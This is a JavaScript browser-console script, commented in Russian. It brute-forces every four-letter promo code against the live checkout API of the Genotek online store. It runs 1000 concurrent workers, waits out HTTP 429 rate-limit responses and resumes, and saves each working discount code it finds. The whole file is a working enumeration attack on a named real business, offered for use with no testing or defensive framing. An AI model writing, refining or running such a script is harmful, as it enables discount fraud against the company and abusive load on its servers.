// ============== НАСТРОЙКИ ==============
const PAYLOAD_TEMPLATE = {
    "data": [{
        "products": [
            { "id": 31180, "quantity": 1 }, { "id": 15906, "quantity": 1 },
            { "id": 420984, "quantity": 1 }, { "id": 520377, "quantity": 1 },
            { "id": 518040, "quantity": 1 }, { "id": 518041, "quantity": 1 },
            { "id": 427571, "quantity": 1 }
        ],
        "lang": "ru", "promoCode": "", "isGift": true
    }],
    "mode": "prod"
};

// --- НАСТРОЙКИ СКОРОСТИ И КОНКУРЕНТНОСТИ ---
const POOL_SIZE = 1000;
const DELAY_MS_PER_WORKER = 1000;
// =======================================

// --- Глобальные переменные ---
let foundPromocodes = JSON.parse(localStorage.getItem('foundGenotekCodes')) || [];
let checkedCount = 0;
let startTime = 0;
let displayIntervalId = null;
const originalTitle = document.title;
const TOTAL_CODES = 26**4;
const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

// --- Вспомогательные функции ---
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
// НОВОЕ: Детерминированная функция генерации кода по индексу
function getCodeFromIndex(index) {
    const i4 = index % 26;
    const i3 = Math.floor(index / 26) % 26;
    const i2 = Math.floor(index / (26**2)) % 26;
    const i1 = Math.floor(index / (26**3)) % 26;
    return CHARS[i1] + CHARS[i2] + CHARS[i3] + CHARS[i4];
}
async function checkCode(promoCode) { const payload = JSON.parse(JSON.stringify(PAYLOAD_TEMPLATE)); payload.data[0].promoCode = promoCode; const formData = new FormData(); formData.append('json', JSON.stringify(payload)); const response = await fetch("https://basket-back.genotek.ru/deal-calc", { method: "POST", body: formData }); return response; }
function processAndLogResult(code, result) { /* ... без изменений ... */ }
function updateDisplay() { /* ... без изменений ... */ }
function displayFinalResults() { /* ... без изменений ... */ }
// Копипаст из предыдущего ответа
function processAndLogResult(code, result) { if (result.data && result.data[0].promo && result.data[0].promo.discount) { const discount = parseFloat(result.data[0].promo.discount); const products = result.data[0].products; let finalPrice = Object.values(products).reduce((total, product) => total + product.PRICE, 0); const foundData = { code, discount: `${discount} ₽`, finalPrice: `${finalPrice.toFixed(2)} ₽` }; console.log(`%c🎉 НАЙДЕН ПРОМОКОД: ${foundData.code} | Скидка: ${foundData.discount} | Итоговая цена: ${foundData.finalPrice}`, 'color: green; font-size: 16px; font-weight: bold;'); if (!foundPromocodes.some(p => p.code === code)) { foundPromocodes.push(foundData); localStorage.setItem('foundGenotekCodes', JSON.stringify(foundPromocodes)); } return true; } return false; }
function updateDisplay() { const percent = ((checkedCount / TOTAL_CODES) * 100).toFixed(2); const elapsedSeconds = (Date.now() - startTime) / 1000; const requestsPerMinute = elapsedSeconds > 1 ? (checkedCount / elapsedSeconds * 60).toFixed(2) : 0; const remainingCodes = TOTAL_CODES - checkedCount; const etaSeconds = requestsPerMinute > 0 ? (remainingCodes / (requestsPerMinute / 60)) : Infinity; const etaHours = (etaSeconds / 3600).toFixed(1); const bar = '█'.repeat(Math.round(30 * (percent / 100))) + '─'.repeat(30 - Math.round(30 * (percent / 100))); const titleText = `[${percent}%] ${checkedCount}/${TOTAL_CODES} | ${foundPromocodes.length} Found`; const consoleText = `\n${titleText}\n${bar}\n\nSpeed: ${requestsPerMinute} req/min\nFound: ${foundPromocodes.length}\nETA: ~${etaHours} h`; document.title = titleText; console.clear(); console.log(consoleText); }
function displayFinalResults() { console.clear(); document.title = "✅ " + originalTitle; console.log('%cПеребор завершен всеми воркерами.', 'color: blue; font-weight: bold;'); if (foundPromocodes.length > 0) { console.log('%c🎉 Итоговый список найденных промокодов:', 'color: green; font-size: 18px; font-weight: bold;'); console.table(foundPromocodes); } else { console.log('%c😔 К сожалению, валидных промокодов не найдено.', 'color: orange;'); } }

// --- Логика Воркера (полностью переработана для независимой работы) ---
async function worker(id, startIndex, endIndex) {
    const totalWorkerCodes = endIndex - startIndex;
    console.log(`%c[Воркер #${id}] Запущен. Диапазон индексов: [${startIndex} - ${endIndex-1}]. Всего: ${totalWorkerCodes} кодов.`, 'color: cyan;');
    
    for (let i = startIndex; i < endIndex; i++) {
        // НОВОЕ: Воркер сам генерирует свой код по индексу
        const code = getCodeFromIndex(i);
        
        try {
            const response = await checkCode(code);
            checkedCount++;

            if (response.status === 429) {
                console.warn(`%c[Воркер #${id}] Попал на Rate Limit. Жду 60 сек...`, 'color: red;');
                await sleep(60000);
            }
            if (response.ok) {
                processAndLogResult(code, await response.json());
            }
        } catch (error) {
            console.error(`[Воркер #${id}] Ошибка сети при проверке кода ${code}:`, error);
        }
        await sleep(DELAY_MS_PER_WORKER);
    }
}


// --- ГЛАВНАЯ ФУНКЦИЯ (ОРКЕСТРАТОР) ---
async function main() {
    try {
        console.log("--- Начальная проверка работоспособности ---");
        const testResponse = await checkCode("EBSFL28283");
        if (testResponse.ok) {
            const success = processAndLogResult("EBSFL28283", await testResponse.json());
            if (success) {
                console.log("--- Проверка пройдена. Через 3 секунды начнется запуск ---");
                await sleep(3000);

                const totalExpectedSpeed = POOL_SIZE * (60000 / DELAY_MS_PER_WORKER);
                console.log(`%cРасчетная общая скорость: ${totalExpectedSpeed.toFixed(2)} запросов/минуту.`, 'color: yellow;');
                
                const chunkSize = Math.ceil(TOTAL_CODES / POOL_SIZE);
                console.log(`%cВоркеров: ${POOL_SIZE}. Кодов на воркера: ~${chunkSize}`, 'color: orange; font-weight: bold;');
                
                startTime = Date.now();
                displayIntervalId = setInterval(() => updateDisplay(), 2000);

                const workerPromises = [];
                for (let i = 0; i < POOL_SIZE; i++) {
                    const startIndex = i * chunkSize;
                    // Убеждаемся, что последний воркер не выйдет за пределы
                    const endIndex = Math.min(startIndex + chunkSize, TOTAL_CODES);
                    workerPromises.push(worker(i + 1, startIndex, endIndex));
                }
                
                await Promise.all(workerPromises);

                clearInterval(displayIntervalId);
                displayFinalResults();
                
            } else { console.error(`❌ Начальная проверка не нашла скидку.`); }
        } else { console.error(`❌ Начальная проверка провалилась. Статус: ${testResponse.status}.`); }
    } catch (e) {
        console.error(`❌ Критическая ошибка на этапе проверки: ${e}.`);
        document.title = "❌ " + originalTitle;
    }
}

main();
